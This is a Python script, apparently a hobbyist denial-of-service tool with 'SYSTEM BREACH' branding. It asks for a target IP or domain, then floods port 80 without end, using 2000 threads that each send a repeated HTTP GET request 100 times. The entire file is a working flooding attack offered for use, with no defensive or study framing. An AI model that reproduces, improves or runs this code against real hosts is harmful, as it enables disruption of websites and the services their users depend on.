import socket, os, sys, time
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init, Style

init(autoreset=True)

def show_logo():
    os.system('clear')
    print(Fore.GREEN + Style.BRIGHT + r"""
            .ed" "be.
          -         -
         /  XXXX  XXXX  \
        |  X  XX  XX  X  |      ---( RANA--NJ )---
        |      XX      |
         \    IIII    /
          -          -
            \      /
             (____)
    """)
    print(Fore.RED + Style.BRIGHT + " [!!!] SYSTEM BREACH !!")
    print(Fore.GREEN + " [+ ACCESS GRANTED +]")
    print(Fore.RED + " ---- RANA--NJ CYBULL v6.66 ---")
    print(Fore.WHITE + "--------------------------------------------------")

def strike(ip, port, payload):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((ip, port))
        for _ in range(100):
            s.send(payload)
        sys.stdout.write(Fore.GREEN + f"[*] ATTACK SENT TO >> {ip}\n")
        s.close()
    except:
        pass

def start():
    show_logo()
    target = input(Fore.GREEN + " └─> Enter Target IP/Domain: " + Fore.WHITE)
    target = target.replace("https://", "").replace("http://", "").split('/')[0]
    payload = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode()
    
    with ThreadPoolExecutor(max_workers=2000) as executor:
        while True:
            executor.submit(strike, target, 80, payload)

if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] STRIKE STOPPED BY USER")
        sys.exit()
